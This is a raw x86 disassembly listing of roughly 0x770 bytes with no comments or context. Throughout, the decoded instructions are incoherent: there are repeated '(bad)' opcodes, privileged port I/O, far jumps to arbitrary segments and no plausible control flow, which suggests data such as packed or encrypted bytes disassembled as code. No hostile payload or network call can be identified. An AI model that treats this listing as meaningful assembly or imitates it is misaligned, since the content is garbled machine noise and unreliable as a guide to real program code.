  41c1ca:	icebp  
  41c1cb:	les    eax,FWORD PTR [eax]
  41c1cd:	sar    DWORD PTR [ebx-0x43],cl
  41c1d0:	pop    ds
  41c1d1:	jmp    0xb0c4d201
  41c1d6:	imul   ebx,DWORD PTR cs:[edi-0x30b408aa],0x62
  41c1de:	jmp    0x6546df77
  41c1e3:	ret    
  41c1e4:	inc    edi
  41c1e5:	dec    eax
  41c1e6:	add    ecx,DWORD PTR [esi-0x6319ca0e]
  41c1ec:	loope  0x41c1d0
  41c1ee:	in     eax,0xa
  41c1f0:	fdivr  st,st(1)
  41c1f2:	sbb    BYTE PTR [ebp+eiz*8+0x14],ah
  41c1f6:	push   eax
  41c1f7:	or     al,BYTE PTR [ecx+0x2459320f]
  41c1fd:	pop    ds
  41c1fe:	into   
  41c1ff:	in     al,dx
  41c200:	ins    BYTE PTR es:[edi],dx
  41c201:	leave  
  41c202:	sub    al,0x19
  41c204:	test   al,0x17
  41c206:	call   0x5d5d:0x9ecec054
  41c20d:	mov    ds:0x43310481,eax
  41c212:	daa    
  41c213:	jmp    0x41c1eb
  41c215:	cs jle 0x41c294
  41c218:	mov    al,al
  41c21a:	pop    eax
  41c21b:	xchg   DWORD PTR [edi-0x1f],ecx
  41c21e:	jae    0x41c291
  41c220:	inc    edx
  41c221:	pop    ss
  41c222:	outs   dx,BYTE PTR ds:[esi]
  41c223:	cmp    esp,0x559cbea
  41c229:	add    bh,BYTE PTR [eax+0x2a]
  41c22c:	js     0x41c1fe
  41c22e:	push   eax
  41c22f:	loopne 0x41c269
  41c231:	imul   ebp,ebp,0x1e
  41c234:	jecxz  0x41c1c4
  41c236:	jo     0x41c1c7
  41c238:	test   al,0xf4
  41c23a:	sbb    al,0x88
  41c23c:	pop    ecx
  41c23d:	inc    ecx
  41c23e:	and    eax,0x8bfba01e
  41c243:	push   ds
  41c244:	ror    DWORD PTR [eax+0x69c4fba9],cl
  41c24a:	das    
  41c24b:	adc    DWORD PTR [ebp+0x37],0x3252b750
  41c252:	call   0x2a51:0xf410f1fc
  41c259:	and    eax,0x624821b3
  41c25e:	leave  
  41c25f:	and    ch,0xcc
  41c262:	adc    BYTE PTR [esi-0x3e],0x73
  41c266:	or     bh,0x78
  41c269:	in     al,dx
  41c26a:	and    esi,DWORD PTR [ecx+0x27642954]
  41c270:	daa    
  41c271:	aad    0xe1
  41c273:	cwde   
  41c274:	sbb    al,0x13
  41c276:	cmp    esi,DWORD PTR ds:0x3b56974d
  41c27c:	push   ecx
  41c27d:	mov    ah,0x11
  41c27f:	dec    eax
  41c280:	daa    
  41c281:	ja     0x41c27d
  41c283:	loope  0x41c239
  41c285:	repnz sub al,BYTE PTR [ebx-0x69]
  41c289:	xchg   ebx,eax
  41c28a:	in     eax,dx
  41c28b:	dec    ebx
  41c28c:	and    BYTE PTR [ebp-0x6a254692],bl
  41c292:	sub    BYTE PTR [edx],cl
  41c294:	push   0xb23cc4d1
  41c299:	mov    al,0xb9
  41c29b:	dec    edx
  41c29c:	into   
  41c29d:	push   ebp
  41c29e:	mov    esi,esi
  41c2a0:	jne    0x41c259
  41c2a2:	sti    
  41c2a3:	ins    DWORD PTR es:[edi],dx
  41c2a4:	sub    ecx,DWORD PTR [esp+eax*1+0x11088e3e]
  41c2ab:	(bad)  
  41c2ac:	int    0xa1
  41c2ae:	inc    ecx
  41c2af:	add    DWORD PTR [esi],ebp
  41c2b1:	mov    dl,0xce
  41c2b3:	std    
  41c2b4:	jne    0x41c306
  41c2b6:	(bad)  
  41c2b7:	pusha  
  41c2b8:	cmp    ebx,eax
  41c2ba:	sar    DWORD PTR [eax],0xcb
  41c2bd:	mov    ds:0xa5004c06,al
  41c2c2:	(bad)  
  41c2c3:	arpl   WORD PTR [eax],cx
  41c2c5:	push   ebp
  41c2c6:	leave  
  41c2c7:	test   DWORD PTR [esi+0x1e],ebp
  41c2ca:	add    DWORD PTR [ebx+edi*2+0x65],esi
  41c2ce:	sbb    eax,0xc42db95d
  41c2d3:	scas   al,BYTE PTR es:[edi]
  41c2d4:	not    DWORD PTR [esp+edx*2]
  41c2d7:	jle    0x41c31b
  41c2d9:	and    al,0xf3
  41c2db:	mov    eax,0xcd6476a
  41c2e0:	push   es
  41c2e1:	popf   
  41c2e2:	fmul   QWORD PTR [esi+0x1a4e505c]
  41c2e8:	arpl   WORD PTR [edi+0x3b],ax
  41c2eb:	mov    eax,ds:0xf1218e3e
  41c2f0:	loope  0x41c341
  41c2f2:	fdiv   DWORD PTR [edi+0x74e4ed0d]
  41c2f8:	adc    esi,DWORD PTR [esi-0x21]
  41c2fb:	mov    cl,0x4b
  41c2fd:	xor    eax,0x1a3a2733
  41c302:	or     BYTE PTR [esi+0x67],0x4a
  41c306:	cmp    eax,0xfdc6188b
  41c30b:	adc    DWORD PTR [ebx-0x38a4a67],ebx
  41c311:	arpl   WORD PTR [ebp+0x7452bad9],bx
  41c317:	mov    edi,0x11ffc5b1
  41c31c:	(bad)  
  41c31d:	(bad)  
  41c31e:	stos   DWORD PTR es:[edi],eax
  41c31f:	ins    DWORD PTR es:[edi],dx
  41c320:	jne    0x41c2c5
  41c322:	xchg   ebx,eax
  41c323:	mov    es,WORD PTR [ecx]
  41c325:	(bad)
  41c328:	mov    esp,0x2bbab10c
  41c32d:	mov    ebp,ebx
  41c32f:	cmp    ecx,edi
  41c331:	loop   0x41c2f3
  41c333:	and    al,0x5c
  41c335:	mov    eax,ds:0x41141a0c
  41c33a:	imul   edx,DWORD PTR [ebx+0x4ccdc494],0x58eb0a56
  41c344:	dec    ebp
  41c345:	sbb    DWORD PTR [edi-0x4e765a8],ecx
  41c34b:	ss sub eax,0x88e47797
  41c351:	scas   eax,DWORD PTR es:[edi]
  41c352:	inc    esp
  41c353:	arpl   WORD PTR [edi],ax
  41c355:	adc    al,0x96
  41c357:	adc    al,0x41
  41c359:	ins    BYTE PTR es:[edi],dx
  41c35a:	lds    edx,FWORD PTR [edi]
  41c35c:	mov    al,ds:0xdef91396
  41c361:	nop
  41c362:	pop    es
  41c363:	mov    ebx,0x232f221d
  41c368:	bound  ebx,QWORD PTR [esi+0x15]
  41c36b:	fcomp  st(0)
  41c36d:	xor    dh,BYTE PTR [esi-0x6d73215b]
  41c373:	cld    
  41c374:	sar    ch,cl
  41c376:	jmp    0x9e0a:0xfede51e1
  41c37d:	jmp    0x41c307
  41c37f:	pop    esi
  41c380:	pop    edi
  41c381:	stc    
  41c382:	mov    edx,0x4c999ef4
  41c387:	shl    dl,1
  41c389:	ins    BYTE PTR es:[edi],dx
  41c38a:	sbb    ebp,DWORD PTR ds:0x173475bf
  41c390:	cmp    al,BYTE PTR [ebp+0x1fd6d513]
  41c396:	leave  
  41c397:	mov    edx,ebx
  41c399:	and    esi,DWORD PTR [edi]
  41c39b:	mov    eax,ds:0x3692fa4a
  41c3a0:	add    dl,ah
  41c3a2:	pop    ecx
  41c3a3:	jge    0x41c3ad
  41c3a5:	xchg   edi,eax
  41c3a6:	mov    esi,0xcafd5f8e
  41c3ab:	ds cli 
  41c3ad:	sbb    bl,dl
  41c3af:	popa   
  41c3b0:	or     eax,0xc10496fe
  41c3b5:	mov    dh,0x8b
  41c3b7:	xor    esp,DWORD PTR [ecx]
  41c3b9:	jg     0x41c414
  41c3bb:	lock das 
  41c3bd:	push   es
  41c3be:	cdq    
  41c3bf:	or     bh,BYTE PTR [edi+0x4]
  41c3c2:	add    al,0x52
  41c3c4:	jle    0x41c3c1
  41c3c6:	adc    eax,0x6e844a04
  41c3cb:	cwde   
  41c3cc:	dec    eax
  41c3cd:	xor    eax,0xe2f75032
  41c3d2:	lea    edi,[eax]
  41c3d4:	inc    eax
  41c3d5:	and    BYTE PTR [ebx],bh
  41c3d7:	lea    ecx,[ecx-0x4e456cb8]
  41c3dd:	push   ebp
  41c3de:	sub    BYTE PTR [ebx],0x77
  41c3e1:	ja     0x41c401
  41c3e3:	or     eax,0xfa4abfe8
  41c3e8:	nop
  41c3e9:	sub    BYTE PTR [ebp+0x5a92de05],ch
  41c3ef:	(bad)  
  41c3f0:	imul   BYTE PTR [ebp-0x13]
  41c3f3:	jge    0x41c462
  41c3f5:	mov    ebx,0xfe536ea1
  41c3fa:	adc    eax,0xa4b16ade
  41c3ff:	mov    bl,BYTE PTR [eax-0x2b035c92]
  41c405:	call   0x2f58d35c
  41c40a:	test   DWORD PTR [edx+0x6b20d67f],0x89180476
  41c414:	xchg   edx,eax
  41c415:	add    al,0x1f
  41c417:	inc    ecx
  41c418:	(bad)  
  41c419:	sub    bh,BYTE PTR [esi-0x1ab5c87]
  41c41f:	push   0xfffffffa
  41c421:	and    ah,BYTE PTR [edx-0x4a]
  41c424:	lods   eax,DWORD PTR ds:[esi]
  41c425:	push   cs
  41c426:	mov    ebp,0x8d857f78
  41c42b:	mov    es,WORD PTR [ecx-0x2b77fd58]
  41c431:	xchg   ebx,eax
  41c432:	popa   
  41c433:	jp     0x41c44a
  41c435:	out    0xcf,eax
  41c437:	mov    esi,DWORD PTR [edi+0x4b]
  41c43a:	fst    st(4)
  41c43c:	pop    ebx
  41c43d:	jmp    0xb6a98c00
  41c442:	mov    esi,0x7ccfb058
  41c447:	mov    ch,ch
  41c449:	inc    edx
  41c44a:	fdiv   QWORD PTR [edi+ecx*1+0x1088a724]
  41c451:	add    BYTE PTR [eax-0x34017df0],bh
  41c457:	pop    ebx
  41c458:	retf   0x7cf1
  41c45b:	mov    ebx,es
  41c45d:	shr    BYTE PTR [ecx-0x2b],0xa0
  41c461:	pop    eax
  41c462:	pop    ebp
  41c463:	sti    
  41c464:	sub    bh,BYTE PTR [eax]
  41c466:	mov    eax,0x58f96ea2
  41c46b:	jno    0x41c43d
  41c46d:	jnp    0x41c489
  41c46f:	lods   al,BYTE PTR ds:[esi]
  41c470:	cs in  eax,0xf1
  41c473:	sbb    ah,BYTE PTR [esi+0x9d2e0ba]
  41c479:	mov    bh,0x85
  41c47b:	es es sbb eax,0xbaba8cc5
  41c482:	rcl    DWORD PTR [esp+esi*1+0x31],cl
  41c486:	xor    ebp,DWORD PTR [ecx]
  41c488:	aaa    
  41c489:	loope  0x41c420
  41c48b:	adc    ch,0x33
  41c48e:	or     BYTE PTR [ebx],ch
  41c490:	cld    
  41c491:	pop    edi
  41c492:	mov    ds:0xf386549a,eax
  41c497:	push   0x5e
  41c499:	dec    esp
  41c49a:	pop    eax
  41c49b:	sub    al,BYTE PTR [ebp-0x4217f38]
  41c4a1:	(bad)  
  41c4a2:	cmp    edx,DWORD PTR [ebp+0x51]
  41c4a5:	jg     0x41c4b3
  41c4a7:	sub    ch,BYTE PTR [edi+0x23]
  41c4aa:	inc    ebx
  41c4ab:	xor    eax,0xa20fe797
  41c4b0:	or     eax,0xe8eaa43e
  41c4b5:	xor    bp,sp
  41c4b8:	add    al,0xfe
  41c4ba:	fwait
  41c4bb:	ror    BYTE PTR [ecx+0x5a],0xf5
  41c4bf:	fwait
  41c4c0:	sahf   
  41c4c1:	lods   al,BYTE PTR ds:[esi]
  41c4c2:	sti    
  41c4c3:	stos   BYTE PTR es:[edi],al
  41c4c4:	xchg   BYTE PTR ds:0x3a456893,al
  41c4ca:	push   cs
  41c4cb:	mov    cl,0x27
  41c4cd:	cmp    ebx,DWORD PTR [eax-0x74]
  41c4d0:	mov    BYTE PTR [ecx-0x5f],bh
  41c4d3:	pop    es
  41c4d4:	jb     0x41c4da
  41c4d6:	or     eax,0x951aa4dc
  41c4db:	mov    ah,0x71
  41c4dd:	cmp    edi,DWORD PTR [edi]
  41c4df:	fcomp  QWORD PTR [ecx+0x33e62a39]
  41c4e5:	cmp    BYTE PTR [ecx],ah
  41c4e7:	out    0x53,al
  41c4e9:	call   0x64a48133
  41c4ee:	mov    dh,BYTE PTR [edx]
  41c4f0:	or     al,0xe4
  41c4f2:	pusha  
  41c4f3:	(bad)  
  41c4f4:	popa   
  41c4f5:	cmp    BYTE PTR [ebx+edx*1+0x16],ah
  41c4f9:	stos   BYTE PTR es:[edi],al
  41c4fa:	imul   esp,DWORD PTR gs:[edi+ecx*1],0x29
  41c4ff:	ret    0xeb41
  41c502:	in     al,dx
  41c503:	xchg   esp,eax
  41c504:	hlt    
  41c505:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c506:	inc    esi
  41c507:	xchg   esi,eax
  41c508:	es cwde 
  41c50a:	adc    ch,dl
  41c50c:	xchg   ecx,eax
  41c50d:	cmp    BYTE PTR [ecx],0xfe
  41c510:	adc    eax,0xee9f523a
  41c515:	xchg   edx,eax
  41c516:	jnp    0x41c587
  41c518:	jbe    0x41c539
  41c51a:	pop    ebx
  41c51b:	int    0x39
  41c51d:	mov    ds:0x561f4d6f,al
  41c522:	loop   0x41c504
  41c524:	jo     0x41c505
  41c526:	(bad)  
  41c528:	inc    edx
  41c529:	push   cs
  41c52a:	out    dx,al
  41c52b:	scas   al,BYTE PTR es:[edi]
  41c52c:	test   DWORD PTR ds:0xa5f3aae8,0x8819b0a1
  41c536:	into   
  41c537:	inc    edx
  41c538:	mov    al,ds:0x2bc81711
  41c53d:	rol    DWORD PTR [edx+esi*8],0x24
  41c541:	jl     0x41c5a0
  41c543:	mov    bl,0xe2
  41c545:	es mov esp,0xd9dda673
  41c54b:	(bad)  
  41c54c:	xor    DWORD PTR [edx],edi
  41c54e:	mov    ecx,0x74d2d3ec
  41c553:	or     DWORD PTR [ebp-0x3c],0x66e15bef
  41c55a:	add    esp,esp
  41c55c:	cdq    
  41c55d:	fsubr  QWORD PTR [edx-0x43]
  41c560:	imul   DWORD PTR [ebp+0x51]
  41c563:	push   esi
  41c564:	cmp    BYTE PTR [edi],0x40
  41c567:	test   eax,0x83b1b997
  41c56c:	inc    esp
  41c56d:	ror    ebp,cl
  41c56f:	lock scas al,BYTE PTR es:[edi]
  41c571:	es nop
  41c573:	and    ch,BYTE PTR [ebp-0x2f]
  41c576:	cmp    ebx,ebp
  41c578:	and    ecx,DWORD PTR [edi-0x7e]
  41c57b:	shr    BYTE PTR [edi+0x6ba01a52],cl
  41c581:	retf   0x415a
  41c584:	sbb    al,0x7c
  41c586:	pop    ecx
  41c587:	inc    esp
  41c588:	ja     0x41c55a
  41c58a:	jo     0x41c5bf
  41c58c:	inc    esp
  41c58d:	xchg   esp,eax
  41c58e:	(bad)  
  41c58f:	test   al,0xcf
  41c591:	mov    al,0x41
  41c593:	add    bl,BYTE PTR [ebx-0x377af864]
  41c599:	fcomip st,st(6)
  41c59b:	add    eax,0xf6342bb8
  41c5a0:	jl     0x41c5d9
  41c5a2:	add    esi,esp
  41c5a4:	sbb    eax,0xa4b875c2
  41c5a9:	into   
  41c5aa:	cmp    eax,0x1c0169dd
  41c5af:	or     DWORD PTR [esi+0x11e0b8d],0x9879330f
  41c5b9:	repnz push es
  41c5bb:	popa   
  41c5bc:	popa   
  41c5bd:	mov    bl,0x91
  41c5bf:	or     ecx,eax
  41c5c1:	add    dl,BYTE PTR [edi+eax*1-0x5d]
  41c5c5:	sbb    DWORD PTR [edi-0x66],ebx
  41c5c8:	outs   dx,DWORD PTR ds:[esi]
  41c5c9:	addr16 call 0x7a2b9176
  41c5cf:	push   0xffffffbb
  41c5d1:	sbb    DWORD PTR [edx+edi*1],edx
  41c5d4:	cwde   
  41c5d5:	add    ch,cl
  41c5d7:	cmc    
  41c5d8:	xchg   esp,eax
  41c5d9:	or     cl,dh
  41c5db:	mov    dl,0x4f
  41c5dd:	popf   
  41c5de:	leave  
  41c5df:	jecxz  0x41c644
  41c5e1:	and    ch,ch
  41c5e3:	pop    esi
  41c5e4:	pop    ss
  41c5e5:	inc    esp
  41c5e6:	push   esi
  41c5e7:	cmp    DWORD PTR [eax-0x46f1aa83],edi
  41c5ed:	(bad)  
  41c5ee:	jg     0x41c5a7
  41c5f0:	cmp    cl,BYTE PTR [eax+ebp*8]
  41c5f3:	jae    0x41c629
  41c5f5:	inc    eax
  41c5f6:	scas   eax,DWORD PTR es:[edi]
  41c5f7:	ins    DWORD PTR es:[edi],dx
  41c5f8:	sar    DWORD PTR [edx+0x3],cl
  41c5fb:	imul   edi,DWORD PTR [ecx+0x2acebb62],0xffffffce
  41c602:	or     bh,BYTE PTR [ecx]
  41c604:	mov    bl,0xd0
  41c606:	push   esi
  41c607:	push   0x331c8fd6
  41c60c:	dec    ecx
  41c60d:	push   0xffffff8a
  41c60f:	sub    esp,DWORD PTR [ebp-0x53]
  41c612:	stos   BYTE PTR es:[edi],al
  41c613:	into   
  41c614:	cmp    eax,0x4814b154
  41c619:	xlat   BYTE PTR ds:[ebx]
  41c61a:	inc    ebx
  41c61b:	stos   DWORD PTR es:[edi],eax
  41c61c:	dec    edi
  41c61d:	sbb    dl,BYTE PTR [ebx+0x161b690c]
  41c623:	(bad)  
  41c624:	jp     0x41c5fd
  41c626:	sub    BYTE PTR [edi-0x2a],al
  41c629:	int3   
  41c62a:	arpl   WORD PTR [edx],dx
  41c62c:	lahf   
  41c62d:	xor    dl,BYTE PTR [edi+0x5c]
  41c630:	push   eax
  41c631:	lea    ebp,[ebx]
  41c633:	jns    0x41c60c
  41c635:	out    0xbc,al
  41c637:	mov    ds:0xd6beec41,eax
  41c63c:	add    eax,0x38559ce8
  41c641:	jnp    0x41c631
  41c643:	xchg   ecx,eax
  41c644:	mov    bl,0x30
  41c646:	cmp    ch,al
  41c648:	sbb    BYTE PTR [edi],cl
  41c64a:	cmp    eax,0x1671125e
  41c64f:	sahf   
  41c650:	push   ebp
  41c651:	aas    
  41c652:	cmp    DWORD PTR [edx-0x348b636a],edx
  41c658:	pop    ds
  41c659:	mov    edi,0x840fb379
  41c65e:	lods   al,BYTE PTR ds:[esi]
  41c65f:	mov    ebx,0xa611af34
  41c664:	mov    DWORD PTR [eax+0x22141ba5],eax
  41c66a:	mov    edx,0x63f04dbe
  41c66f:	rcl    esp,1
  41c671:	out    0xb9,eax
  41c673:	pop    ebx
  41c674:	jp     0x41c5fa
  41c676:	cwde   
  41c677:	icebp  
  41c678:	out    0x13,eax
  41c67a:	inc    edi
  41c67b:	dec    eax
  41c67c:	out    dx,al
  41c67d:	adc    esi,DWORD PTR [ecx]
  41c67f:	popf   
  41c680:	clc    
  41c681:	dec    edx
  41c682:	jnp    0x41c6a1
  41c684:	jmp    0x4d0072a
  41c689:	das    
  41c68a:	lahf   
  41c68b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c68c:	or     esp,DWORD PTR [ebx]
  41c68e:	shr    BYTE PTR ds:0xa11a75f8,1
  41c694:	ret    
  41c695:	adc    eax,0xeb192a16
  41c69a:	or     bl,BYTE PTR [edi-0x5d82128]
  41c6a0:	sbb    esi,DWORD PTR [eax]
  41c6a2:	sbb    eax,0xf2660d3b
  41c6a7:	scas   eax,DWORD PTR es:[edi]
  41c6a8:	int    0x60
  41c6aa:	(bad)  
  41c6ab:	fnstcw WORD PTR [eax-0x45]
  41c6ae:	fdivr  st(0),st
  41c6b0:	(bad)  
  41c6b1:	add    ebp,0xffffff86
  41c6b4:	repnz push ebp
  41c6b6:	add    DWORD PTR [ecx+ebp*1],ebp
  41c6b9:	mov    ch,0x7c
  41c6bb:	div    al
  41c6bd:	loop   0x41c6fd
  41c6bf:	pop    ss
  41c6c0:	jg     0x41c704
  41c6c2:	xchg   edi,eax
  41c6c3:	add    ch,al
  41c6c5:	sti    
  41c6c6:	leave  
  41c6c7:	sar    BYTE PTR [ecx],cl
  41c6c9:	cmp    bl,BYTE PTR [ebp+0xd090180]
  41c6cf:	xor    ecx,DWORD PTR [eax+0x138cb19c]
  41c6d5:	retf   0x6c95
  41c6d8:	mov    DWORD PTR [edx+0x1],edi
  41c6db:	pop    esi
  41c6dc:	jae    0x41c697
  41c6de:	mov    bl,0x25
  41c6e0:	mov    dl,0xad
  41c6e2:	inc    esp
  41c6e3:	sbb    DWORD PTR [ebx+0x21],0x3c
  41c6e7:	inc    eax
  41c6e8:	inc    esp
  41c6e9:	pop    ebp
  41c6ea:	sahf   
  41c6eb:	ret    0x4e8f
  41c6ee:	cdq    
  41c6ef:	push   ebp
  41c6f0:	cli    
  41c6f1:	dec    BYTE PTR [eax+0x7d]
  41c6f4:	cmp    BYTE PTR [edx+0x7a],bl
  41c6f7:	or     ecx,DWORD PTR [edx-0x62]
  41c6fa:	icebp  
  41c6fb:	(bad)  
  41c6fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c6fd:	in     eax,0x3d
  41c6ff:	xlat   BYTE PTR ds:[ebx]
  41c700:	adc    DWORD PTR [edx],edx
  41c702:	inc    edi
  41c703:	add    al,0xf8
  41c705:	xchg   ecx,eax
  41c706:	sahf   
  41c707:	xor    eax,0x2af60dd5
  41c70c:	mov    al,ds:0xc42063dd
  41c711:	or     al,BYTE PTR [edx]
  41c713:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c714:	lea    esi,[eax]
  41c716:	fcomp  QWORD PTR [ebx]
  41c718:	xchg   DWORD PTR [ecx+0x50],esi
  41c71b:	clc    
  41c71c:	dec    eax
  41c71d:	sbb    ah,ch
  41c71f:	arpl   dx,bp
  41c721:	scas   al,BYTE PTR es:[edi]
  41c722:	lahf   
  41c723:	shr    BYTE PTR [edx-0x1c8c999f],0xb1
  41c72a:	sbb    cl,0x98
  41c72d:	add    DWORD PTR [edi+0x66],eax
  41c730:	mov    eax,ds:0xa8bdf7f0
  41c735:	mov    eax,ds:0xf02dbe1b
  41c73a:	xlat   BYTE PTR ds:[ebx]
  41c73b:	mov    bl,BYTE PTR ds:0x4341c0f0
  41c741:	out    dx,eax
  41c742:	imul   esp,DWORD PTR [ebp-0x2c84857c],0xc9a5409e
  41c74c:	push   esp
  41c74d:	je     0x41c6fc
  41c74f:	outs   dx,DWORD PTR ds:[esi]
  41c750:	ror    DWORD PTR [ebx+0x21174e3e],1
  41c756:	xor    dl,ch
  41c758:	daa    
  41c759:	jmp    0xc463:0x29412b76
  41c760:	adc    dl,bh
  41c762:	jb     0x41c7a9
  41c764:	pop    ds
  41c765:	add    eax,0xbb721c6f
  41c76a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c76b:	dec    ebx
  41c76c:	nop
  41c76d:	ins    DWORD PTR es:[edi],dx
  41c76e:	jnp    0x41c707
  41c770:	mov    edx,esp
  41c772:	mov    ch,0xa4
  41c774:	adc    bl,dl
  41c776:	xchg   sp,ax
  41c778:	mov    ah,0xee
  41c77a:	adc    al,ah
  41c77c:	outs   dx,BYTE PTR ds:[esi]
  41c77d:	xchg   BYTE PTR [edi-0x4e7914b5],bl
  41c783:	out    0x60,al
  41c785:	mov    cl,BYTE PTR [esi]
  41c787:	jecxz  0x41c7c5
  41c789:	sbb    dh,BYTE PTR [ecx]
  41c78b:	es jg  0x41c77d
  41c78e:	dec    ebp
  41c78f:	stos   BYTE PTR es:[edi],al
  41c790:	in     al,dx
  41c791:	test   eax,0x463ff119
  41c796:	adc    esi,esi
  41c798:	lahf   
  41c799:	and    edx,DWORD PTR [ebp-0x5d2cda95]
  41c79f:	mov    esp,0xe8e015b9
  41c7a4:	sub    al,0x75
  41c7a6:	popa   
  41c7a7:	sbb    BYTE PTR [eax],0xe7
  41c7aa:	ret    
  41c7ab:	adc    al,0xf
  41c7ad:	in     eax,dx
  41c7ae:	faddp  st(6),st
  41c7b0:	mov    bh,0x75
  41c7b2:	add    bl,BYTE PTR [ebp+0x705b41ad]
  41c7b8:	push   ecx
  41c7b9:	adc    al,ah
  41c7bb:	(bad)  
  41c7bc:	out    0x5b,eax
  41c7be:	add    al,0x26
  41c7c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c7c1:	(bad)  
  41c7c2:	out    dx,al
  41c7c3:	mov    ecx,0x1ea1aae
  41c7c8:	lea    edx,[esi+ebx*4-0x1a]
  41c7cc:	or     eax,0x9c79b9a1
  41c7d1:	xchg   ebx,eax
  41c7d2:	outs   dx,DWORD PTR ds:[esi]
  41c7d3:	ss add eax,0x3a1fe2fb
  41c7d9:	sub    edx,DWORD PTR [edi+0x7e]
  41c7dc:	hlt    
  41c7dd:	mov    esp,0xca7287c9
  41c7e2:	xchg   DWORD PTR [edi+0xc],esp
  41c7e5:	sub    eax,0xb9b0f6
  41c7ea:	mov    esp,0x3a75c694
  41c7ef:	jae    0x41c778
  41c7f1:	xchg   ebx,eax
  41c7f2:	lock cli 
  41c7f4:	dec    ebp
  41c7f5:	sub    al,0x45
  41c7f7:	push   esi
  41c7f8:	into   
  41c7f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c7fa:	push   ebx
  41c7fb:	into   
  41c7fc:	dec    eax
  41c7fd:	ror    BYTE PTR [ebx-0x539bf74a],cl
  41c803:	(bad)  
  41c804:	(bad)  
  41c806:	dec    edi
  41c807:	outs   dx,BYTE PTR ds:[esi]
  41c808:	xlat   BYTE PTR ds:[ebx]
  41c809:	icebp  
  41c80a:	jae    0x41c870
  41c80c:	cmc    
  41c80d:	into   
  41c80e:	sub    BYTE PTR [ecx+0x4b],al
  41c811:	dec    ebp
  41c812:	popa   
  41c813:	push   eax
  41c814:	pop    esp
  41c815:	jne    0x41c7e8
  41c817:	jge    0x41c83c
  41c819:	sahf   
  41c81a:	ja     0x41c888
  41c81c:	xor    DWORD PTR [ecx],0x91e0c19
  41c822:	fistp  WORD PTR [edi+0x2e0270a9]
  41c828:	sbb    esp,ecx
  41c82a:	ja     0x41c7d0
  41c82c:	pop    ds
  41c82d:	stos   BYTE PTR es:[edi],al
  41c82e:	mov    edx,0x48448da1
  41c833:	push   ebx
  41c834:	not    DWORD PTR [edi-0x7680e321]
  41c83a:	aaa    
  41c83b:	sar    DWORD PTR [ebx-0x5df06fab],cl
  41c841:	mov    ds:0x2e239706,eax
  41c846:	fist   DWORD PTR [ecx]
  41c848:	pop    eax
  41c849:	add    edi,edi
  41c84b:	mov    ds:0x94b569e4,al
  41c850:	in     eax,0x1c
  41c852:	popa   
  41c853:	(bad)  
  41c854:	xor    al,bh
  41c856:	in     eax,0x37
  41c858:	js     0x41c8c1
  41c85a:	mov    edi,0x80e30e18
  41c85f:	je     0x41c82f
  41c861:	das    
  41c862:	add    edi,DWORD PTR [edx+ebx*1+0x4fa942e7]
  41c869:	js     0x41c80b
  41c86b:	xor    dl,BYTE PTR [ecx+0x32]
  41c86e:	adc    eax,eax
  41c870:	ins    BYTE PTR es:[edi],dx
  41c871:	dec    ecx
  41c872:	or     bl,BYTE PTR [esi+0x33]
  41c875:	mov    al,ds:0x2a8d9261
  41c87a:	push   ebx
  41c87b:	push   ebx
  41c87c:	(bad)  
  41c87d:	dec    eax
  41c87e:	jns    0x41c813
  41c880:	sbb    BYTE PTR [eax+0x78b623b],dh
  41c886:	pop    ebp
  41c887:	jmp    0x4581:0x272e137d
  41c88e:	fbld   TBYTE PTR [edi+0x7]
  41c891:	cmc    
  41c892:	shr    BYTE PTR ds:0xb21d2add,cl
  41c898:	(bad)  
  41c899:	jnp    0x41c8ca
  41c89b:	aad    0x27
  41c89d:	jmp    0x41c8bb
  41c89f:	cld    
  41c8a0:	lahf   
  41c8a1:	cmp    cl,BYTE PTR [eax-0x39f25bcd]
  41c8a7:	fcom   DWORD PTR [edi]
  41c8a9:	out    0xae,eax
  41c8ab:	(bad)  
  41c8ac:	mov    edi,0xf1ff7bdf
  41c8b1:	icebp  
  41c8b2:	mov    ds:0x15fdeac3,al
  41c8b7:	jmp    0x41c87f
  41c8b9:	xchg   ebx,eax
  41c8ba:	shl    BYTE PTR [edx-0x17ff938d],0x87
  41c8c1:	repz dec ebx
  41c8c3:	xor    DWORD PTR [eax-0xa],ebp
  41c8c6:	cmc    
  41c8c7:	pop    eax
  41c8c8:	inc    eax
  41c8c9:	jae    0x41c861
  41c8cb:	or     BYTE PTR gs:[esi-0x4247b9a5],dh
  41c8d2:	fprem  
  41c8d4:	jmp    0x41c8b9
  41c8d6:	rcl    edi,1
  41c8d8:	mov    bh,0xcf
  41c8da:	cmp    DWORD PTR [edi],0x39
  41c8dd:	ret    
  41c8de:	mov    esi,DWORD PTR es:[esi]
  41c8e1:	into   
  41c8e2:	or     al,0x71
  41c8e4:	push   esi
  41c8e5:	ror    BYTE PTR [ebx+0x22053468],1
  41c8eb:	and    DWORD PTR [edi],esi
  41c8ed:	inc    esp
  41c8ee:	bound  esp,QWORD PTR [ebx-0x73]
  41c8f1:	mov    ?,ebx
  41c8f3:	aam    0x94
  41c8f5:	mov    bh,0xad
  41c8f7:	addr16 xchg ebp,eax
  41c8f9:	mov    WORD PTR [ecx],fs
  41c8fb:	gs aam 0x60
  41c8fe:	cmp    eax,0x2f9300d8
  41c903:	inc    ebx
  41c904:	jb     0x41c949
  41c906:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c907:	sbb    ebp,DWORD PTR [esi]
  41c909:	mov    fs,WORD PTR [edx]
  41c90b:	sub    bl,BYTE PTR [ecx]
  41c90d:	xchg   ecx,eax
  41c90e:	lea    edx,[esi+0x25fa9dc1]
  41c914:	or     dl,BYTE PTR [edi]
  41c916:	shr    BYTE PTR [ecx-0x45],0x9c
  41c91a:	stos   DWORD PTR es:[edi],eax
  41c91b:	inc    eax
  41c91c:	dec    ebx
  41c91d:	mov    ah,0x20
  41c91f:	sbb    al,0x6d
  41c921:	jl     0x41c8cd
  41c923:	cmp    ah,bh
  41c925:	lahf   
  41c926:	xchg   ebp,eax
  41c927:	sub    al,0x28
  41c929:	leave  
  41c92a:	cmp    eax,eax
  41c92c:	fisub  DWORD PTR [ebp-0x75477f95]
  41c932:	lock jo 0x41c8d8
  41c935:	bound  ebx,QWORD PTR [edx+0x12]
  41c938:	or     esp,0x3e0ede1b
  41c93e:	ret    
